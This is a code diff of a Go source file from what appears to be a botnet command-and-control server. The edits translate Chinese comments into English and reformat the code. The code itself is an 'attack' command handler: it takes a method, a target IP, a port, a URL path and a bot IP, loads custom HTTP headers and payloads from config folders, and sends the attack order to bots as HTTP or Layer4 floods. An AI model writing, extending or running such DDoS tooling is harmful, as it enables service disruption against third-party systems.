@@ -5,21 +5,21 @@ import (
 	"io/ioutil"
 	"os"
 	"path/filepath"
-	"strings"
 	"strconv"
-	
+	"strings"
+
 	"c2/bot"
 	"c2/config"
 )
 
-// LoadHeadersAndPayload 从指定文件夹读取header.txt和payload.txt
+// LoadHeadersAndPayload reads header.txt and payload.txt from the specified folder
 func LoadHeadersAndPayload(folderPath string) (string, string, error) {
-	// 将路径统一定位到config目录下
+	// Adjust the path to point to the config directory
 	folderPath = filepath.Join(config.ConfigDir, folderPath)
-	header := "" 
+	header := ""
 	payload := ""
-	
-	// 从header.txt加载头部（如果存在）
+
+	// Load headers from header.txt (if it exists)
 	headerPath := filepath.Join(folderPath, "header.txt")
 	if _, err := os.Stat(headerPath); err == nil {
 		headerData, err := ioutil.ReadFile(headerPath)
@@ -28,8 +28,8 @@ func LoadHeadersAndPayload(folderPath string) (string, string, error) {
 		}
 		header = string(headerData)
 	}
-	
-	// 从payload.txt加载负载数据（如果存在）
+
+	// Load payload data from payload.txt (if it exists)
 	payloadPath := filepath.Join(folderPath, "payload.txt")
 	if _, err := os.Stat(payloadPath); err == nil {
 		payloadData, err := ioutil.ReadFile(payloadPath)
@@ -38,14 +38,14 @@ func LoadHeadersAndPayload(folderPath string) (string, string, error) {
 		}
 		payload = string(payloadData)
 	}
-	
+
 	return header, payload, nil
 }
 
-// HandleAttack 处理攻击命令
+// HandleAttack processes the attack command
 func HandleAttack(args []string) {
 
-	// 检查最小所需参数（方法、目标、端口）
+	// Check minimum required parameters (method, target, port)
 	if len(args) < 3 {
 		fmt.Println("[!] Usage: attack <method> <target IP> <port> [path] [dataFolder/botIP]")
 		fmt.Printf("Available methods: %v\n", config.GetAllMethods())
@@ -54,40 +54,40 @@ func HandleAttack(args []string) {
 
 	method := strings.ToUpper(args[0])
 	target := args[1]
-	port,err := strconv.Atoi(args[2])
+	port, err := strconv.Atoi(args[2])
 	if err != nil {
 		fmt.Println("[!] Invalid port number")
 		return
 	}
-	
-	// 初始化基本参数
-	path := ""       // 第4个参数: URL路径或botIP
-	botIP := ""      // 特定机器人IP（可选）
-	
-	// 默认空头部和负载
-	header := ""   // 空JSON对象字符串
+
+	// Initialize basic parameters
+	path := ""  // 4th parameter: URL path or botIP
+	botIP := "" // Specific bot IP (optional)
+
+	// Default empty header and payload
+	header := "" // Empty JSON object string
 	payload := ""
 
-	// 验证攻击方法
+	// Validate attack method
 	if !config.IsValidMethod(method) {
 		fmt.Println("[!] Invalid attack method")
 		return
 	}
 
-	// 根据攻击方法类型处理参数
+	// Handle parameters based on attack method type
 	if config.IsHTTPMethod(method) {
-		// HTTP方法，需要path和可能的配置名称
+		// HTTP methods require path and possibly a config name
 		if len(args) > 3 {
-			path = args[3] // URL路径
+			path = args[3] // URL path
 		}
-		
+
 		if len(args) > 4 {
 			configNameOrIP := args[4]
-			
-			// 检查配置目录是否存在
+
+			// Check if the config directory exists
 			configPath := filepath.Join(config.ConfigDir, configNameOrIP)
 			if fi, err := os.Stat(configPath); err == nil && fi.IsDir() {
-				// 从配置目录加载头部和负载
+				// Load headers and payload from the config directory
 				var err error
 				header, payload, err = LoadHeadersAndPayload(configNameOrIP)
 				if err != nil {
@@ -96,32 +96,32 @@ func HandleAttack(args []string) {
 				}
 				fmt.Printf("[+] Loaded headers and payload from config/%s/\n", configNameOrIP)
 			} else {
-				// 不是配置名称，当作机器人IP
+				// Not a config name, treat as bot IP
 				botIP = configNameOrIP
 			}
 		}
-		
-		// 如果有第6个参数，它必须是机器人IP
+
+		// If there is a 6th parameter, it must be the bot IP
 		if len(args) > 5 {
 			botIP = args[5]
 		}
 	} else if config.IsLayer4Method(method) {
-		// Layer4攻击，path/header/payload保持为空，任何第4个参数都视为机器人IP
+		// Layer4 attacks keep path/header/payload empty, any 4th parameter is treated as bot IP
 		if len(args) > 3 {
 			botIP = args[3]
 		}
 	}
 
-	// 构建发送给bot的命令（总是6个参数）
+	// Build the command to send to the bot (always 6 parameters)
 	command := config.BotCommand{
 		Method:  method,
 		IP:      target,
 		Port:    port,
 		Path:    path,
-		Header:  header, 
-		Payload: payload,  
+		Header:  header,
+		Payload: payload,
 	}
-	
-	// 发送命令给机器人
+
+	// Send the command to the bot
 	bot.SendBotCommand(command, botIP)
 }
